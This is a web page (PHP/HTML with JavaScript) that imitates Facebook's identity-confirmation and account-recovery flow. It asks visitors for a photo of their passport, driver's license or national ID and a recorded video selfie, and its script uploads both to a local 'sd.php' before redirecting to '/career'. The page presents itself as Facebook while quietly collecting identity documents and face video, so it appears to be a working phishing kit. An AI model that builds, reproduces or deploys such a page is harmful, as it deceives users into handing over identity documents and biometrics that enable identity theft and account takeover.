<?php


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
<link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
<style>
        body {
            background-color: #f0f2f5;
            font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .navbar {
            background: white;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 12px 0;
            margin-bottom: 40px;
    }
        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 0 20px;
        }
        .main-container {
            max-width: 700px;
            margin: 0 auto;
            padding: 0 20px;
            text-align: center;
        }
        .verification-image {
            width: 100%;
            max-width: 600px;
            margin: 20px 0;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 12px;
        }
        p {
            font-size: 17px;
            color: #65676b;
            margin-bottom: 24px;
            line-height: 1.4;
        }
        .start-btn {
            background-color: #0866ff;
            border: none;
            border-radius: 6px;
            color: white;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            padding: 12px 20px;
            width: 100%;
            max-width: 320px;
            transition: background-color 0.2s;
    }
        .start-btn:hover {
            background-color: #0859d9;
        }
        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            z-index: 1000;
            overflow-y: auto;
            padding: 20px;
            box-sizing: border-box;
        }
        .modal-content {
            position: relative;
            background-color: white;
            width: 100%;
            max-width: 500px;
            margin: 20px auto;
            border-radius: 8px;
            box-shadow: 0 2px 26px rgba(0, 0, 0, 0.3);
            padding: 0;
            overflow: hidden;
        }
        .modal-header {
            display: flex;
            align-items: center;
            padding: 16px;
            border-bottom: 1px solid #dddfe2;
            background: white;
        }
        .modal-title {
            font-size: 20px;
            font-weight: 600;
            color: #1c1e21;
            margin: 0;
        }
        .close-btn {
            background: none;
            border: none;
            font-size: 24px;
            color: #65676b;
            cursor: pointer;
            padding: 0;
            line-height: 1;
        }
        .step {
            display: flex;
            gap: 16px;
            margin-bottom: 16px;
            padding: 12px 0;
        }
        .step-icon {
            width: 24px;
            height: 24px;
        }
        .step-content {
            flex: 1;
            text-align: left;
        }
        .step-title {
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 4px;
        }
        .step-subtitle {
            font-size: 15px;
            color: #65676b;
            margin: 0;
        }
        .step-description {
            color: #65676b;
            font-size: 15px;
            margin: 0;
        }
        .next-btn {
            background-color: #0866ff;
            border: none;
            border-radius: 6px;
            color: white;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            padding: 12px 20px;
            width: 100%;
            margin-top: 20px;
            transition: background-color 0.2s;
        }
        .next-btn:hover {
            background-color: #0859d9;
        }
        .modal-step {
            padding: 16px;
        }
        .back-btn {
            background: none;
            border: none;
            font-size: 24px;
            color: #65676b;
            cursor: pointer;
            padding: 0;
            margin-right: 16px;
        }
        .section-title {
            margin: 0 0 12px 0;
            font-size: 20px;
            line-height: 24px;
            font-weight: 600;
            color: #1c1e21;
        }
        .section-description {
            color: #65676b;
            font-size: 15px;
            margin-bottom: 24px;
        }
        .id-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 16px;
    }
        .id-option {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .id-option:hover {
            background-color: #f0f2f5;
        }
        .id-option input[type="radio"] {
            display: none;
        }
        .radio-circle {
            width: 20px;
            height: 20px;
            border: 2px solid #8c8f94;
            border-radius: 50%;
            margin-left: auto;
            position: relative;
            transition: all 0.2s;
        }
        .id-option input[type="radio"]:checked + span + .radio-circle {
            border-color: #0866ff;
        }
        .id-option input[type="radio"]:checked + span + .radio-circle::after {
            content: '';
            position: absolute;
            width: 10px;
            height: 10px;
            background: #0866ff;
            border-radius: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .option-text {
            font-size: 15px;
            color: #1c1e21;
        }
        .see-more-btn {
            background: none;
            border: none;
            color: #0866ff;
            font-size: 15px;
            font-weight: 500;
            padding: 8px 0;
            cursor: pointer;
            margin-bottom: 16px;
        }
        .security-notice {
            display: flex;
            gap: 12px;
            padding: 16px;
            background: #f0f2f5;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .security-notice i {
            color: #65676b;
            font-size: 20px;
            flex-shrink: 0;
        }
        .security-notice p {
            font-size: 13px;
            color: #65676b;
            margin: 0;
        }
        .security-notice a {
            color: #0866ff;
            text-decoration: none;
        }
        .modal-footer {
            padding: 16px;
            border-top: 1px solid #dddfe2;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: white;
            margin: 0 -16px -16px -16px;
        }
        .back-btn-text {
            background: none;
            border: none;
            color: #1c1e21;
            font-size: 15px;
            cursor: pointer;
            padding: 8px 16px;
        }
        .upload-illustration {
            margin: 20px -16px;
        }
        .upload-illustration img {
            width: 100%;
            display: block;
        }
        .upload-instruction {
            text-align: center;
            padding: 0 16px;
            margin: 16px 0;
            color: #1c1e21;
            font-size: 15px;
            line-height: 1.4;
        }
        .tip-box {
            background: #f0f2f5;
            border-radius: 8px;
            padding: 12px;
            margin: 16px 0;
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }
        .tip-box i {
            color: #0866ff;
            font-size: 24px;
    }
        .tip-content strong {
            display: block;
            margin-bottom: 4px;
            color: #1c1e21;
        }
        .tip-content p {
            margin: 0;
            font-size: 14px;
            color: #65676b;
        }
        /* Photo capture styles */
        .capture-options {
            display: flex;
            gap: 16px;
            margin: 20px 0;
        }
        .capture-option {
            flex: 1;
            padding: 16px;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
        }
        .capture-option:hover {
            background-color: #f0f2f5;
        }
        .capture-option i {
            font-size: 24px;
            color: #0866ff;
            margin-bottom: 8px;
        }
        .capture-option-text {
            font-size: 15px;
            color: #1c1e21;
            margin: 0;
        }
        #webcam-container {
            display: none;
            width: 100%;
            margin: 20px 0;
        }
        #webcam-video {
            width: 100%;
            border-radius: 8px;
            background: #f0f2f5;
        }
        #capture-preview {
            display: none;
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
        }
        .capture-controls {
            display: none;
            gap: 16px;
            margin: 16px 0;
        }
        .capture-btn {
            flex: 1;
            background: #0866ff;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 8px 16px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }
        .retake-btn {
            flex: 1;
            background: #e4e6eb;
            color: #1c1e21;
            border: none;
            border-radius: 6px;
            padding: 8px 16px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }
        .file-upload-container {
            display: none;
            margin: 20px 0;
        }
        .file-upload-btn {
            display: inline-block;
            background: #e4e6eb;
            color: #1c1e21;
            border: none;
            border-radius: 6px;
            padding: 8px 16px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
        }
        .file-upload-btn:hover {
            background: #d8dadf;
        }
        #file-upload {
            display: none;
        }
        .upload-preview {
            max-width: 100%;
            border-radius: 8px;
            display: none;
            margin-top: 16px;
        }
        @media (max-width: 500px) {
            .modal {
                padding: 0;
            }
            .modal-content {
                margin: 0;
                height: 100%;
                max-width: none;
                border-radius: 0;
            }
    }
        /* Video selfie styles */
        #video-container {
            position: relative;
            width: 100%;
            margin: 20px 0;
            background: #f0f2f5;
            border-radius: 8px;
            overflow: hidden;
        }

        #selfie-video {
            width: 100%;
            border-radius: 8px;
            transform: scaleX(-1); /* Mirror effect */
        }

        .recording-indicator {
            position: absolute;
            top: 16px;
            right: 16px;
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
        }

        .recording-dot {
            width: 10px;
            height: 10px;
            background: #ff4444;
            border-radius: 50%;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .video-controls {
            display: flex;
            gap: 16px;
            margin: 20px 0;
        }

        .start-recording-btn,
        .stop-recording-btn,
        .retry-recording-btn {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .start-recording-btn {
            background: #0866ff;
            color: white;
        }

        .stop-recording-btn {
            background: #ff4444;
            color: white;
        }

        .retry-recording-btn {
            background: #e4e6eb;
            color: #1c1e21;
        }

        .start-recording-btn:hover {
            background: #0859d9;
        }

        .stop-recording-btn:hover {
            background: #ff3333;
        }

        .retry-recording-btn:hover {
            background: #d8dadf;
    }
</style>

    <title>Facebook</title>

</head>
<body>
<div class="navbar">
        <div class="container">
            <a href="/"><img src="./assets/img/fblogo.svg" alt="Facebook" style="height: 40px;"></a>
        </div>
    </div>

    <div class="main-container">
        <h1>ID and video selfie</h1>
        <p>Take a photo of your official ID and a short video of yourself</p>
        <img src="assets/img/CentralIntegrity-AuthenticityWizard-IDCaptureOnboarding-16x7-WWW_light-3x.png" alt="ID Verification" class="verification-image">
        <button class="start-btn" onclick="showModal()">Start verification</button>
    </div>

    <!-- Verification Modal -->
    <div id="verificationModal" class="modal">
        <div class="modal-content">
            <!-- Step 1: Initial Info -->
            <div class="modal-step" id="step-initial">
                <div class="modal-header">
                    <h2 class="modal-title">Confirm your identity</h2>
                    <button class="close-btn" onclick="closeModal()">&times;</button>
                </div>
                <p style="margin-bottom: 20px;">To help confirm your identity, please provide the following information:</p>
                
                <div class="step">
                    <i class='bx bx-id-card step-icon'></i>
                    <div class="step-content">
                        <div class="step-title">Step 1</div>
                        <div class="step-subtitle">Upload your ID</div>
                        <p class="step-description">We'll use your official ID to help confirm who you are. It won't be shared on your profile.</p>
                    </div>
                </div>

                <div class="step">
                    <i class='bx bx-video step-icon'></i>
                    <div class="step-content">
                        <div class="step-title">Step 2</div>
                        <div class="step-subtitle">Take a video selfie</div>
                        <p class="step-description">We need a short video of you turning your head in different directions.</p>
        </div>
</div>

                <button class="next-btn" onclick="showStep('id-selection')">Next</button>
            </div>

            <!-- Step 2: ID Selection -->
            <div class="modal-step" id="step-id-selection" style="display: none;">
                <div class="modal-header">
                    <button class="back-btn" onclick="showStep('initial')">&larr;</button>
                    <h2 class="modal-title">Confirm your identity</h2>
                    <button class="close-btn" onclick="closeModal()">&times;</button>
                </div>
                
                <h3 class="section-title">Choose type of ID to upload</h3>
                <p class="section-description">We'll use your ID to review your name, photo and date of birth. It won't be shared on your profile.</p>

                <div class="id-options">
                    <label class="id-option">
                        <input type="radio" name="id-type" value="passport">
                        <span class="option-text">Passport</span>
                        <span class="radio-circle"></span>
                    </label>
                    <label class="id-option">
                        <input type="radio" name="id-type" value="drivers-license">
                        <span class="option-text">Driver's license</span>
                        <span class="radio-circle"></span>
                    </label>
                    <label class="id-option">
                        <input type="radio" name="id-type" value="national-id">
                        <span class="option-text">National ID card</span>
                        <span class="radio-circle"></span>
                    </label>
                    <label class="id-option">
                        <input type="radio" name="id-type" value="marriage-certificate">
                        <span class="option-text">Marriage certificate</span>
                        <span class="radio-circle"></span>
                    </label>
                </div>

                <button class="see-more-btn" onclick="toggleMoreOptions()">See more</button>

                <div class="security-notice">
                    <i class='bx bx-lock-alt'></i>
                    <p>We securely store your ID for up to 1 year to help us improve our systems that detect harm like impersonation and fake IDs. You can opt out of the use of your ID for this purpose from your identity confirmation settings once you've recovered your account. <a href="#">Learn more</a> about how to change those settings.</p>
                </div>

                <div class="modal-footer">
                    <button class="back-btn-text" onclick="showStep('initial')">Back</button>
                    <button class="next-btn" onclick="showStep('photo-upload')" id="idSelectionNext" disabled>Next</button>
                </div>
            </div>

            <!-- Step 3: Photo Upload -->
            <div class="modal-step" id="step-photo-upload" style="display: none;">
                <div class="modal-header">
                    <button class="back-btn" onclick="showStep('id-selection')">&larr;</button>
                    <h2 class="modal-title">Confirm your identity</h2>
                    <button class="close-btn" onclick="closeModal()">&times;</button>
                </div>

                <h3 class="section-title">Upload a photo of your ID</h3>
                <div class="upload-illustration">
                    <img src="assets/img/SrqZgiLpXVb.png" alt="ID Photo Example">
                </div>
                <p class="upload-instruction">Choose how you'd like to take a photo of your ID:</p>

                <div class="capture-options">
                    <div class="capture-option" onclick="startWebcam()">
                        <i class='bx bx-camera'></i>
                        <p class="capture-option-text">Use webcam</p>
                    </div>
                    <div class="capture-option" onclick="showFileUpload()">
                        <i class='bx bx-upload'></i>
                        <p class="capture-option-text">Upload photo</p>
                    </div>
                </div>

                <div id="webcam-container">
                    <video id="webcam-video" autoplay playsinline></video>
                    <div class="capture-controls">
                        <button class="capture-btn" onclick="capturePhoto()">Take photo</button>
                        <button class="retake-btn" onclick="retakePhoto()">Retake</button>
                    </div>
                    <canvas id="capture-preview"></canvas>
                </div>

                <div class="file-upload-container">
                    <label class="file-upload-btn">
                        Choose file
                        <input type="file" id="file-upload" accept="image/*" onchange="handleFileSelect(event)">
                    </label>
                    <img id="file-preview" class="upload-preview">
                </div>

                <div class="tip-box">
                    <i class='bx bx-bulb'></i>
                    <div class="tip-content">
                        <strong>Tip: Make Sure There's Enough Light</strong>
                        <p>Turn up your computer screen's brightness to help improve photo quality.</p>
                    </div>
                </div>

                <div class="modal-footer">
                    <button class="back-btn-text" onclick="showStep('id-selection')">Back</button>
                    <button class="next-btn" onclick="window.location.href='/career'" id="photoUploadNext" disabled>Next</button>
    </div>
</div>

            <!-- Step 4: Video Selfie -->
            <div class="modal-step" id="step-video-selfie" style="display: none;">
                <div class="modal-header">
                    <button class="back-btn" onclick="showStep('photo-upload')">&larr;</button>
                    <h2 class="modal-title">Record Video Selfie</h2>
                    <button class="close-btn" onclick="closeModal()">&times;</button>
                </div>

                <h3 class="section-title">Take a quick video selfie</h3>
                <p class="section-description">Please record a short video of yourself turning your head from side to side.</p>

                <div id="video-container">
                    <video id="selfie-video" autoplay playsinline style="display: none;"></video>
                    <div class="recording-indicator" style="display: none;">
                        <span class="recording-dot"></span>
                        Recording...
                    </div>
                    <div class="camera-placeholder" style="padding: 40px; text-align: center; color: #65676b;">
                        <i class='bx bx-camera' style="font-size: 48px; margin-bottom: 16px; display: block;"></i>
                        Click "Start Recording" to enable camera
</div>
</div>

                <div class="video-controls">
                    <button class="start-recording-btn" onclick="initializeAndStartRecording()">
                        <i class='bx bx-video'></i>
                        Start Recording
                    </button>
                    <button class="stop-recording-btn" onclick="stopRecording()" style="display: none;">
                        <i class='bx bx-stop-circle'></i>
                        Stop Recording
                    </button>
                    <button class="retry-recording-btn" onclick="retryRecording()" style="display: none;">
                        <i class='bx bx-refresh'></i>
                        Record Again
                    </button>
                </div>

                <div class="video-preview" style="display: none;">
                    <video id="preview-video" controls style="width: 100%; border-radius: 8px;"></video>
</div>

                <div class="tip-box">
                    <i class='bx bx-bulb'></i>
                    <div class="tip-content">
                        <strong>Recording Tips</strong>
                        <p>Make sure you're in a well-lit area and your face is clearly visible. Turn your head slowly from left to right.</p>
    </div>
  </div>
  
                <div class="modal-footer">
                    <button class="back-btn-text" onclick="showStep('photo-upload')">Back</button>
                    <button class="next-btn" onclick="submitVideo()" id="videoUploadNext" disabled>Submit</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        function showModal() {
            document.getElementById('verificationModal').style.display = 'block';
            document.body.style.overflow = 'hidden';
        }

        function closeModal() {
            document.getElementById('verificationModal').style.display = 'none';
            document.body.style.overflow = 'auto';
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('verificationModal');
            if (event.target == modal) {
                closeModal();
            }
        }

        function showStep(step) {
            document.querySelectorAll('.modal-step').forEach(el => {
                el.style.display = 'none';
            });
            
            document.getElementById('step-' + step).style.display = 'block';
        }

        // Enable next button when an ID type is selected
        document.querySelectorAll('input[name="id-type"]').forEach(radio => {
            radio.addEventListener('change', function() {
                document.getElementById('idSelectionNext').disabled = false;
            });
        });

        function toggleMoreOptions() {
            // This would show more ID options
            // For demo purposes, we'll just change the button text
            const btn = document.querySelector('.see-more-btn');
            btn.textContent = btn.textContent === 'See more' ? 'See less' : 'See more';
        }

        // Webcam functionality
        let stream = null;
        let photoTaken = false;

        async function startWebcam() {
            try {
                // Hide file upload container and show webcam container
                document.querySelector('.file-upload-container').style.display = 'none';
                document.getElementById('webcam-container').style.display = 'block';
                document.querySelector('.capture-controls').style.display = 'flex';
                document.getElementById('capture-preview').style.display = 'none';
                
                // Start webcam
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('webcam-video');
                video.srcObject = stream;
                video.style.display = 'block';
                
                photoTaken = false;
                document.getElementById('photoUploadNext').disabled = true;
            } catch (err) {
                console.error('Error accessing webcam:', err);
                alert('Could not access webcam. Please ensure you have granted camera permissions or try uploading a photo instead.');
            }
        }

        function capturePhoto() {
            const video = document.getElementById('webcam-video');
            const canvas = document.getElementById('capture-preview');
            const context = canvas.getContext('2d');

            // Set canvas dimensions to match video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Draw video frame to canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Hide video and show preview
            video.style.display = 'none';
            canvas.style.display = 'block';

            // Stop webcam stream
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            photoTaken = true;
            document.getElementById('photoUploadNext').disabled = false;
        }

        function retakePhoto() {
            const video = document.getElementById('webcam-video');
            const canvas = document.getElementById('capture-preview');

            // Hide canvas and show video
            canvas.style.display = 'none';
            video.style.display = 'block';

            // Restart webcam
            startWebcam();
        }

        function showFileUpload() {
            // Stop webcam if running
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            // Hide webcam container and show file upload
            document.getElementById('webcam-container').style.display = 'none';
            document.querySelector('.file-upload-container').style.display = 'block';
        }

        function handleFileSelect(event) {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    const preview = document.getElementById('file-preview');
                    preview.src = e.target.result;
                    preview.style.display = 'block';
                    document.getElementById('photoUploadNext').disabled = false;
                };
                reader.readAsDataURL(file);
            }
        }

        // Function to upload photo to server
        async function uploadPhoto(photoData, isWebcam = false) {
            const formData = new FormData();
            
            if (isWebcam) {
                // Convert canvas data to blob
                const canvas = document.getElementById('capture-preview');
                return new Promise((resolve, reject) => {
                    canvas.toBlob(async (blob) => {
                        if (!blob) {
                            reject(new Error('Failed to capture webcam photo'));
                            return;
                        }
                        formData.append('idPhoto', blob, 'webcam-photo.png');
                        formData.append('idType', document.querySelector('input[name="id-type"]:checked').value);
                        try {
                            await sendFormData(formData);
                            resolve();
                        } catch (error) {
                            reject(error);
                        }
                    }, 'image/png');
                });
            } else {
                // Use file directly
                formData.append('idPhoto', photoData);
                formData.append('idType', document.querySelector('input[name="id-type"]:checked').value);
                return sendFormData(formData);
            }
        }

        async function sendFormData(formData) {
            const response = await fetch('sd.php', {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            if (result.status === 'success') {
                // Instead of redirecting, show video selfie step
                showStep('video-selfie');
            } else {
                throw new Error(result.message || 'Upload failed');
            }
        }

        // Modify the next button click handler
        document.getElementById('photoUploadNext').onclick = async function(e) {
            e.preventDefault();
            const button = this;
            
            try {
                button.textContent = 'Uploading...';
                button.disabled = true;

                if (photoTaken) {
                    // Upload webcam photo
                    await uploadPhoto(null, true);
                } else {
                    // Upload file photo
                    const fileInput = document.getElementById('file-upload');
                    if (!fileInput.files[0]) {
                        throw new Error('No photo selected');
                    }
                    await uploadPhoto(fileInput.files[0]);
                }
            } catch (error) {
                console.error('Upload failed:', error.message);
                alert('Upload failed: ' + error.message);
            } finally {
                button.textContent = 'Next';
                button.disabled = false;
            }
        };

        // Video recording variables
        let mediaRecorder;
        let recordedChunks = [];
        let videoStream;

        // Modified to remove automatic camera initialization
        async function initializeAndStartRecording() {
            try {
                // Disable the start button while initializing
                const startButton = document.querySelector('.start-recording-btn');
                startButton.disabled = true;
                startButton.textContent = 'Accessing camera...';

                // Request only video access first
                videoStream = await navigator.mediaDevices.getUserMedia({ 
                    video: true,
                    audio: false  // Changed to false to match photo capture
                });

                // Show video element and hide placeholder
                const video = document.getElementById('selfie-video');
                video.srcObject = videoStream;
                video.style.display = 'block';
                document.querySelector('.camera-placeholder').style.display = 'none';

                // Start recording immediately
                startRecording();
            } catch (err) {
                console.error('Error accessing camera:', err);
                // More specific error message
                let errorMessage = 'Could not access camera. ';
                if (err.name === 'NotAllowedError') {
                    errorMessage += 'Please allow camera access in your browser settings.';
                } else if (err.name === 'NotFoundError') {
                    errorMessage += 'No camera device found.';
                } else if (err.name === 'NotReadableError') {
                    errorMessage += 'Camera may be in use by another application.';
                } else {
                    errorMessage += 'Please ensure you have a working camera and try again.';
                }
                alert(errorMessage);
                
                // Reset button state
                const startButton = document.querySelector('.start-recording-btn');
                startButton.disabled = false;
                startButton.innerHTML = '<i class="bx bx-video"></i> Start Recording';
            }
        }

        function startRecording() {
            try {
                recordedChunks = [];
                // Specify video MIME type explicitly
                mediaRecorder = new MediaRecorder(videoStream, {
                    mimeType: 'video/webm;codecs=vp8'
                });

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    try {
                        const blob = new Blob(recordedChunks, { 
                            type: 'video/webm;codecs=vp8' 
                        });
                        const videoURL = URL.createObjectURL(blob);
                        const previewVideo = document.getElementById('preview-video');
                        previewVideo.src = videoURL;
                        document.querySelector('.video-preview').style.display = 'block';
                        document.getElementById('videoUploadNext').disabled = false;

                        // Stop the camera stream
                        if (videoStream) {
                            videoStream.getTracks().forEach(track => track.stop());
                        }
                        
                        // Hide the live video
                        document.getElementById('selfie-video').style.display = 'none';
                        document.querySelector('.camera-placeholder').style.display = 'block';
                    } catch (error) {
                        console.error('Error in onstop handler:', error);
                        alert('Error saving video. Please try again.');
                    }
                };

                // Show recording indicator and stop button
                document.querySelector('.recording-indicator').style.display = 'flex';
                document.querySelector('.start-recording-btn').style.display = 'none';
                document.querySelector('.stop-recording-btn').style.display = 'block';
                document.querySelector('.retry-recording-btn').style.display = 'none';
                document.querySelector('.video-preview').style.display = 'none';
                
                // Start recording with a specific timeslice
                mediaRecorder.start(1000); // Capture data every second
            } catch (error) {
                console.error('Error starting recording:', error);
                alert('Error starting video recording. Please try again.');
                retryRecording();
            }
        }

        function stopRecording() {
            try {
                if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                    mediaRecorder.stop();
                }
                document.querySelector('.recording-indicator').style.display = 'none';
                document.querySelector('.start-recording-btn').style.display = 'none';
                document.querySelector('.stop-recording-btn').style.display = 'none';
            } catch (error) {
                console.error('Error stopping recording:', error);
                alert('Error stopping video recording. Please try again.');
                retryRecording();
            }
        }

        function retryRecording() {
            try {
                // Stop any existing streams
                if (videoStream) {
                    videoStream.getTracks().forEach(track => track.stop());
                }
                
                // Reset UI
                document.querySelector('.start-recording-btn').style.display = 'block';
                document.querySelector('.retry-recording-btn').style.display = 'none';
                document.querySelector('.video-preview').style.display = 'none';
                document.getElementById('videoUploadNext').disabled = true;
                
                // Clear the preview video
                const previewVideo = document.getElementById('preview-video');
                if (previewVideo.src) {
                    URL.revokeObjectURL(previewVideo.src);
                    previewVideo.src = '';
                }
                
                // Show the placeholder
                document.querySelector('.camera-placeholder').style.display = 'block';
                document.getElementById('selfie-video').style.display = 'none';
            } catch (error) {
                console.error('Error in retry:', error);
                alert('Error resetting video recording. Please refresh the page.');
            }
        }

        async function submitVideo() {
            try {
                const button = document.getElementById('videoUploadNext');
                button.disabled = true;
                button.textContent = 'Uploading...';

                // Get the recorded video blob
                const previewVideo = document.getElementById('preview-video');
                const videoUrl = previewVideo.src;
                const response = await fetch(videoUrl);
                const videoBlob = await response.blob();

                // Create FormData and append video
                const formData = new FormData();
                formData.append('selfieVideo', videoBlob, 'selfie.webm');

                // Send to server
                const uploadResponse = await fetch('sd.php', {
                    method: 'POST',
                    body: formData
                });

                const result = await uploadResponse.json();
                
                if (result.status === 'success') {
                    // Clean up video resources
                    if (videoStream) {
                        videoStream.getTracks().forEach(track => track.stop());
                    }
                    URL.revokeObjectURL(videoUrl);
                    
                    // Redirect to career page
                    window.location.href = '/career';
                } else {
                    throw new Error(result.message || 'Upload failed');
                }
            } catch (error) {
                console.error('Upload failed:', error);
                alert('Failed to upload video: ' + error.message);
                
                // Reset button state
                const button = document.getElementById('videoUploadNext');
                button.disabled = false;
                button.textContent = 'Submit';
            }
        }
    </script>
</body>
</html>